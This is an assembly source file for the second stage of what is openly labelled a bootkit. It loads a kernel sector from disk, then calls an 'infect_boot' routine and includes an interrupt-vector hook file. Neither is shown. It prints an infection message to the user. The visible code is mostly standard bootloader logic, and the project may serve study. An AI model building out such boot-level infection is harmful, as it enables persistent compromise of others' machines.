[org 0x7e00]
[bits 16]

%define KERNEL_OFFSET       0x7c00
%define KERNEL_SEGMENT      0x0000
%define VGA_3RDLINE_OFFSET  480

start_stg2:
    mov [bootdrive], dl

    mov si, stg2_init
    call print_string

    call enable_a20

    mov si, a20_msg
    call print_string

    ; Loading kernel
    mov si, kload_init
    call print_string
    ; 3-try retry mechanism
    mov cx, 3

load_kernel:
    push cx

    mov ax, KERNEL_SEGMENT
    mov es, ax
    mov bx, KERNEL_OFFSET

    ; Reading kernel disk sector
    mov ah, 0x02
    mov al, 1
    mov ch, 0
    mov cl, 1 ; Reading at sector 1
    mov dh, 0
    mov dl, 0x80 ; First HD
    int 0x13

    pop cx
    jnc .success

    mov si, kload_att_err
    call print_string

    loop load_kernel

    .success:
        ; Sanity check
        mov ax, [KERNEL_OFFSET]
        cmp ax, 0
        je .error

        ; Infecting boot (bootkit routine)
        call infect_boot

        mov si, boot_infected
        call print_string

        ; Finishing kernel loading (Real Mode)
        mov si, kload_success
        call print_string

        jmp KERNEL_SEGMENT:KERNEL_OFFSET

        ; Finishing kernel loading (Protected Mode)
        ; mov dword [cursor_pos], VGA_3RDLINE_OFFSET
        ; call switch_to_pm

    .error:
        mov si, kload_err
        call print_string
        jmp $ ; Halt

enable_a20:
    pusha
    in al, 0x92
    or al, 2
    out 0x92, al
    popa
    ret

[bits 32]

begin_pm:
    ; mov ebx, pm_str
    ; ...

    ; mov ebx, jumping_kernel_str
    ; ...

    jmp CODE_SEG:KERNEL_OFFSET

%include "protected_mode.asm"
%include "../bootkit/ivt_hook.asm"
%include "../utils/print16.asm"

; Variables
cursor_pos dd 0
bootdrive db 0

; Strings
stg2_init      db  10, "Starting bootloader stage 2 in Real Mode at 0x7e00...", 13, 10, 0
a20_msg        db  "Enabled Fast A20 Gate.", 13, 10, 0
kload_init     db  "Starting kernel loading from disk...", 13, 10, 0
kload_att_err  db  "Kernel loading error. Trying again...", 13, 10, 0
kload_err      db  "Error while trying to load the kernel. Aborted.", 13, 10, 0
boot_infected  db  10, 10, 10, "Your PC is now o Melhor do Mundo, gracas a Deus.", 13, 10, 10, 10, 0
kload_success  db  10, "Kernel loaded successfully!", 13, 10, 10, "Transfering control...", 13, 10, 10, 10, 0

times 4096 - ($ - $$) db 0
